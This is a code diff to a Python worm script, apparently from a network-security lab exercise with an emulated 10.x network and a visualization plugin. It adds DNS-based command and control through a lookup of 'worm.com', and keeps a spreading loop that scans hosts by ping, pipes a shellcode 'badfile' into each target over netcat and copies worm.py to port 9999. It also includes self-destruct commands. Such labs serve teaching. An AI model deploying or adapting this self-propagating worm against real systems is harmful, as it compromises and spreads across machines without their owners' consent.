@@ -57,8 +57,11 @@ def getNextTarget():
       ipaddr = f"10.{a}.0.{b}"
   
       # Get the output of the ping command, look for "1 received" 
-      output = subprocess.check_output(f"ping -q -c1 -W1 {ipaddr}", shell=True)
-      result = output.find(b'1 received')
+      try:
+         output = subprocess.check_output(f"ping -q -c1 -W1 {ipaddr}", shell=True)
+         result = output.find(b'1 received')
+      except subprocess.CalledProcessError as e:
+         result = -1
 
       if result == -1:
          print(f"{ipaddr} is not alive", flush=True)
@@ -75,15 +78,43 @@ def isInfectedAlready():
     else: 
         return False
 
+# This is for visualization. 
+DISPLAY = "bash /map-plugins/submit_event.sh -a {}"
+def visualize(on=True):
+    if on:
+         if os.path.isfile("/map-plugins/submit_event.sh"):
+             # Directly submit event to map: flash for 5 seconds, and then highlight
+             subprocess.run([f"{DISPLAY.format('flash')} && sleep 5 && {DISPLAY.format('highlight')}"], shell=True)
+         else:
+             # Sends ICMP echo message to a non-existing machine every 2 seconds.
+             subprocess.run([f"pkill ping"], shell=True) # kill the ping process if any
+             subprocess.Popen(["ping -q -i2 1.2.3.4"], shell=True)
+    else:
+         if os.path.isfile("/map-plugins/submit_event.sh"):
+             subprocess.run(["sleep 1 && " +  DISPLAY.format("restore")], shell=True)
+         else:
+             subprocess.run([f"pkill ping"], shell=True) # kill the ping process if any
 
 def getCommand():
     try:
        ip_address = socket.gethostbyname("worm.com")
-       p = ip_address.split('.')
-       return int(p[0])
-
     except socket.gaierror:
        print("Error: The hostname could not be resolved.")
+
+    ip = ip_address.split('.')
+    cmd = int(ip[0])
+    if cmd == 0:
+            return 'run'
+    elif cmd == 1:
+            return 'stop'
+    elif cmd == 2:
+            return 'pause'
+    elif cmd == 10: 
+            return 'show'
+    elif cmd == 11: 
+            return 'off'
+    else:
+            return 'run'
 
 ############################################################### 
 
@@ -94,25 +125,46 @@ if isInfectedAlready():
     print("The host is already infected; do nothing and exit!", flush=True)
     exit(0)
 
-# This is for visualization. It sends an ICMP echo message to 
-# a non-existing machine every 2 seconds.
-subprocess.Popen(["ping -q -i2 1.2.3.4"], shell=True)
+# Visualize the worm
+visualize(on=True)
 
 # Create the badfile 
 createBadfile()
 
 # Launch the attack on other servers
+current_status = 'run'
 while True:
     cmd = getCommand()
-    if cmd == 0:  # pause
-        print("Self destruction ...", end="", flush=True)
-        subprocess.run([f"pkill ping"], shell=True) # kill the ping process
-        subprocess.run([f"rm badfile"], shell=True) # remove the badfile
-        break
-    elif cmd == 1:  # pause
-        time.sleep(2)
-        print("Pausing ...", end="", flush=True)
-        continue
+    if cmd == 'stop':
+          current_status = 'stop'
+          print("Self destruction ...", end="", flush=True)
+          subprocess.run([f"pkill -f 'nc -lnv 9999'"], shell=True) # kill the ping process
+          subprocess.run([f"pkill ping"], shell=True) # kill the ping process
+          subprocess.run([f"rm -f badfile"], shell=True) # remove the badfile
+          subprocess.run([f"rm -f worm.py"], shell=True) # remove the badfile
+          if os.path.isfile("/map-plugins/submit_event.sh"):
+              subprocess.run([f"sleep 1 && {DISPLAY.format('restore')}"], shell=True)
+          break
+    elif cmd == 'pause':
+          print("Pausing ...", end="", flush=True)
+          current_status = 'pause'
+          time.sleep(5)
+          continue
+    elif cmd == 'show':
+          visualize(on=True)
+          if current_status != 'run':
+              time.sleep(5) 
+              continue
+    elif cmd == 'off':
+          visualize(on=False)
+          if current_status != 'run':
+              time.sleep(5) 
+              continue
+    elif cmd == 'run':
+          current_status = 'run'
+          pass
+    else: 
+          pass
 
     targetIP = getNextTarget()
 
@@ -123,7 +175,7 @@ while True:
     subprocess.run([f"cat badfile | nc -w3 {targetIP} 9090"], shell=True)
 
     # Give the shellcode some time to run on the target host
-    time.sleep(1)
+    time.sleep(2)
 
     # Send a copy of this program (worm.py) to the target host
     subprocess.run([f"nc -w3 {targetIP} 9999 < worm.py"], shell=True)
